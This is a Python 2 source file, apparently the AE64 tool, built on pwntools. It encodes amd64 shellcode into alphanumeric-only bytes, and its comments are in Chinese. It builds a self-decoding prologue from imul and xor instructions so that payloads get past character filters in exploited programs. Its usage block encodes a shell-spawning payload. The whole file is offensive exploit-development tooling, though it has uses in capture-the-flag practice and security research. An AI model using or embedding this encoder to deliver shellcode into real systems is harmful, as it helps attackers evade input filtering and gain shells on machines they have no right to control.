#coding=utf8
from pwn import context,asm,success,shellcraft,debug
context.arch = 'amd64'

class AE64():
	def __init__(self):
		self.alphanum = map(ord,list('UVWXYZABCDEFGHIJKLMNOPQRSTabcdefghijklmnopqrstuvwxyz0123456789'))
		self.shift_tbl=[65,97,48,66,98,49,67,99,50,68,100,51,69,101,
						52,70,102,53,71,103,54,72,104,55,73,105,56,
						74,106,57,75,107,76,108,77,109,78,110,79,111,
						80,112,81,113,82,114,83,115,84,116,85,117,86,
						118,87,119,88,120,89,121,90,122]
		self.mul_cache={} # 用于缓存imul的结果
		self.mul_rdi=0 # 用于减少mul使用次数从而缩短shellcode
		self.nop = 'Q' # nop = asm('push rcx')
		self.nop2 = 'QY' # nop2 = asm('push rcx;pop rcx')

		self.init_encoder_asm = '''
		/* set encoder */
		/* 0x5658 x 0x30 == 0x103080 (53,128) r8 */
		/* 0x5734 x 0x30 == 0x1059c0 (89,192) r9 */
		/* 0x5654 x 0x5a == 0x1e5988 (89,136) r10 */
		/* 0x6742 x 0x64 == 0x2855c8 (85,200) rdx */

		push   0x30
		push   rsp
		pop    rcx

		imul   di,WORD PTR [rcx],0x5658
		push   rdi
		pop    r8 /* 0x3080 */

		imul   di,WORD PTR [rcx],0x5734
		push   rdi
		pop    r9 /* 0x59c0 */

		push   0x5a
		push   rsp
		pop    rcx

		imul   di,WORD PTR [rcx],0x5654
		push   rdi
		pop    r10 /* 0x5988 */

		push   0x64
		push   rsp
		pop    rcx

		imul   di,WORD PTR [rcx],0x6742
		push   rdi
		pop    rdx /* 0x55c8 */
		'''
		# self.init_encoder = asm(self.init_encoder_asm)
		self.init_encoder = 'j0TYfi9XVWAXfi94WWAYjZTYfi9TVWAZjdTYfi9BgWZ'

		self.zero_rdi_asm='''
		push rdi

		push rsp
		pop rcx
		xor rdi,[rcx]

		pop rcx
		'''
		# self.zero_rdi = asm(self.zero_rdi_asm)
		self.zero_rdi = 'WTYH39Y'
		self.vaild_reg = ['rax','rbx','rcx','rdx','rdi','rsi','rbp','rsp',
						'r8','r9','r10','r11','r12','r13','r14','r15']

	def encode(self,raw_sc,addr_in_reg='rax',pre_len=0,is_rdi_zero=0):
		r'''
		raw_sc：需要encode的机器码
		addr_in_reg: 指向shellcode附近的寄存器名称，默认rax
		pre_len：因为默认rax指向shellcode附近，这个字段的意思为 reg+pre_len == encoder的起始地址，默认0
		is_rdi_zero: 跑shellcode之前rdi是否为0，如果确定为0,可以设置此flag为1，这样可以省去几byte空间，默认0即rdi不为0
		encoder_len：留给encoder的最大字节长度(会自动调整)

		地址构成：
		rax --> xxxxx  \
				xxxxx  | pre_len (adjust addr to rax)
				xxxxx  /
		encoder yyyyy  \
				yyyyy  | encoder_len
				yyyyy  /
		your_sc	zzzzz  \
				zzzzz  | encoded shellcode
				zzzzz  |
				zzzzz  /
		'''
		save_log_level = context.log_level
		context.log_level = 99

		if not is_rdi_zero:
			self.prologue = self.zero_rdi+self.init_encoder
		else:
			self.prologue = self.init_encoder
		
		addr_in_reg=addr_in_reg.lower()
		if addr_in_reg != 'rax':
			if addr_in_reg not in self.vaild_reg:
				print '[-] not vaild reg'
				return None
			else:
				self.prologue=asm('push {};pop rax;\n'.format(addr_in_reg))+self.prologue

		self.raw_sc = raw_sc
		self.pre_len = pre_len
		self.encoder_len=len(self.prologue)
		if not self.encode_raw_sc():
			print '[-] error while encoding raw_sc'
			return None
		while True:
			debug('AE64: trying length {}'.format(self.encoder_len))
			encoder = asm(self.gen_encoder(self.pre_len+self.encoder_len))
			final_sc = self.prologue+encoder
			if self.encoder_len >= len(final_sc) and self.encoder_len-len(final_sc) <= 6:# nop len
				break
			self.encoder_len=len(final_sc)
		nop_len = self.encoder_len - len(final_sc)
		context.log_level = save_log_level

		success('shellcode generated, length info -> prologue:{} + encoder:{} + nop:{} + encoded_sc:{} == {}'.format(
			len(self.prologue),
			len(final_sc)-len(self.prologue),
			nop_len,
			len(self.enc_raw_sc),
			len(final_sc)+nop_len+len(self.enc_raw_sc)))
		final_sc += self.nop2*(nop_len/2)+self.nop*(nop_len%2)+self.enc_raw_sc
		return final_sc

	def encode_raw_sc(self):
		'''
		计算encode后的shellcode，以及需要的加密步骤(encoder)
		'''
		reg=['rdx','r8','r9','r10']
		dh=[0x55,0x30,0x59,0x59]
		dl=[0xc8,0x80,0xc0,0x88]

		tmp_sc=list(self.raw_sc)
		# 帮助后续生成encoder。
		# 由三部分组成：
		# 寄存器所提供地址和所要加密字节的偏移；用到的寄存器；是高8字节(dh)还是低8字节(dl)
		encoder_info=[] 

		for i in range(len(self.raw_sc)):
			oc = ord(self.raw_sc[i])
			if oc not in self.alphanum: # 不是alphanumeric才需要加密
				for j,n in enumerate(dh if oc < 0x80 else dl):
					if oc^n in self.alphanum:
						tmp_sc[i] = chr(oc^n)
						encoder_info.append((i,reg[j],1 if oc < 0x80 else 0))
						break
		self.enc_raw_sc = ''.join(tmp_sc)
		self.encoder_info = encoder_info
		return 1

	def find_mul_force(self,need):
		'''
		用于查找所需word如何由两个数相乘＆0xffff得到
		'''
		result_cache = self.mul_cache.get(need)
		if result_cache:
			return result_cache
		for h in self.alphanum:
			for l in self.alphanum:
				mul_word = (h<<8)+l
				for mul_byte in self.alphanum:
					if (mul_word*mul_byte)&0xffff == need:
						self.mul_cache[need] = (mul_word,mul_byte) # add to mul cache
						return (mul_word,mul_byte)
		# not find
		return (0,0)

	def find_mul_add(self,need):
		'''
		用于查找所需offset如何由两个数相乘&0xffff再加上一个常数得到
		'''
		if self.mul_rdi == 0: #not used yet
			for shift in self.shift_tbl:
				if need-shift > 0:
					mul_word,mul_byte = self.find_mul_force(need-shift)
					if mul_word != 0: # find it
						self.mul_rdi = [mul_word,mul_byte]
						return (mul_word,mul_byte,shift)
		else: # 说明encoder已经设置了rdi，为了让shellcode尽量短，应尽量使用常数调整，而不是重新设置rdi
			rdi = (self.mul_rdi[0]*self.mul_rdi[1])&0xffff
			if need-rdi in self.shift_tbl: # we find offset
				return (self.mul_rdi[0],self.mul_rdi[1],need-rdi)
			else: # not find :(
				for shift in self.shift_tbl:
					if need-shift > 0:
						mul_word,mul_byte = self.find_mul_force(need-shift)
						if mul_word != 0: # find it
							self.mul_rdi = [mul_word,mul_byte]
							return (mul_word,mul_byte,shift)
		print 'cant find mul for {} :('.format(need)
		exit(0)
	
	def gen_encoder(self,offset):
		'''
		根据函数encode_raw_sc得到的结果生成encoder
		'''
		sc =''
		old_rdi=[0,0]
		for raw_idx,regname,hl in self.encoder_info:
			idx = offset+raw_idx
			mul_word,mul_byte,shift = self.find_mul_add(idx)
			if mul_word == old_rdi[0] and mul_byte == old_rdi[1]: # edi not changed
				pass
			else:
				sc+='push {};push rsp;pop rcx;imul di,[rcx],{};\n'.format(mul_byte,mul_word)
				old_rdi = self.mul_rdi
			if regname != 'rdx': #backup rdx and set
				sc+='push rdx;push {};pop rdx;\n'.format(regname)

			sc+='xor [rax+rdi+{}],{};\n'.format(shift,'dh' if hl else 'dl')

			if regname!= 'rdx': #restore rdx
				sc+='pop rdx;\n'
		return sc

if __name__ == "__main__":
	print '[+] this is the usage:'
	shsc = asm(shellcraft.sh())
	loop = asm('loop: jmp loop')
	obj = AE64()
	print obj.encode(shsc)
	print obj.encode(loop,'rbx',0x30,1)